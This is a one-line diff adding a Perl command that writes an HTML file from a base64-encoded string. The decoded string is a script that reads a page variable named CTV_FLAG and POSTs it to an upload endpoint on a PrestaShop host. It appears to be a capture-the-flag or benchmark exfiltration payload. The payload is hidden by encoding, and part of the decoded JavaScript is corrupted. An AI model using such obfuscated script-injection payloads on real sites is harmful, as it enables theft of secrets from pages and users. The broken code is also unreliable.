@@ -1,0 +1,1 @@
+perl -e 'use MIME::Base64; open(F, ">/tmp/flag.html"); print F decode_base64("PHNjcmlwdD5jb25zdCBmPXdpbmRvdy5DVFZfRkxBRztmZXRjaCgnaHR0cDovL3ByZXN0YXNob3Auc3RvcmUubG9jYWw6ODA4MC91cGxvYWQnLCHtbWV0aG9kOidQT1NUJyxoZWFkZXJzOntcIkNvbnRlbnQtVHlwZVwiOntcImFwcGxpY2F0aW9uL2pzb25cIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7ZmxhZzpmfSkpfSk7PC9zY3JpcHQ+"); close(F);'
